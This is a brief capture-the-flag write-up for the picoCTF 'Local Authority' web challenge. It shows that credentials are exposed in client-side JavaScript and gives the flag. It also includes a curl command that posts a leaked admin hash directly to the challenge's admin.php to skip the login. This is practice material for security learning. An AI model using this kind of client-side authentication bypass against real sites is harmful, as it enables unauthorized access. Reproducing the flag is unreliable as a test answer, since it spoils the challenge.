# Local Authority

## Problem

Can you get the flag? Go to this website and see what you can discover.

## Solution

just enter random username and password, then inspect the javascript file on the page that is shown after you submitted the informations (the file is called secure.js)

then enter username and password based on the information you see when checking username and password there

the flag is then gonna be shown after your successful login attempt

here's the flag: picoCTF{j5_15_7r4n5p4r3n7_b0c2c9cb}

furter investigations:
we have the following hash in login.php

```
if(loggedIn)
{
  document.getElementById('msg').innerHTML = "Log In Successful";
  document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
  document.getElementById('hiddenAdminForm').submit();
}
```

from the above code, we can see that if the creds are correct, "adminFormHash" value is gonna be replaced with the hash, therefore if we post the hash to the admin page, we should get the flag

here's the full bash instruction

```
curl -X POST --data hash=2196812e91c29df34f5e217cfd639881 "http://saturn.picoctf.net:64275/admin.php" | grep -oE picoCTF{.*?} --color=none
```
